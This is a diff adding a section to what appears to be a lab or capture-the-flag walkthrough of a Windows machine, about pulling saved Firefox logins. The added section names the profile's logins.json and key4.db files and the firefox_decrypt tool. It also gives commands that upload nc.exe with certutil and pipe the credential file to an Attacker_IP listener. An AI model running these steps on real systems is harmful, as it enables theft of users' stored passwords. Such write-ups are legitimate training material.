@@ -449,4 +449,31 @@ What i dismissed was icacl search the two files in the folder gatekeeper exe and
 ```
 icacls "C:\Users\natbat\desktop\gatekeeper.exe" # or .bat
 ```
+## Firefox had to be looked at more carefully
+
+It was widely known that credentials can be obtained from firefox, so searching around I found firefox decryptor for credentials, the main files of interest were logins.json and key4.db to use the decryptor.
+
+Script for decryptor 
+```
+sudo git clone https://github.com/unode/firefox_decrypt/   
+```
+Files required are located in:
+```
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+```
+Netcat was uploaded with certutil in documents folder of natbat. Then used to upload files to attack PC for decryption:
+Where in most default kali install nc.exe is installed at:
+```
+/usr/share/windows-resources/binaries
+#set up simple server and call with certutil from target
+Then download the logins.json and key4.db
+# Using netcat to send:
+C:\Users\natbat\Documents>nc.exe -nv Attacker_IP PORT < logins.json
+# To Receive
+└─$ sudo nc -lnvp PORT > logins.json
+```
+
+
+
+
 
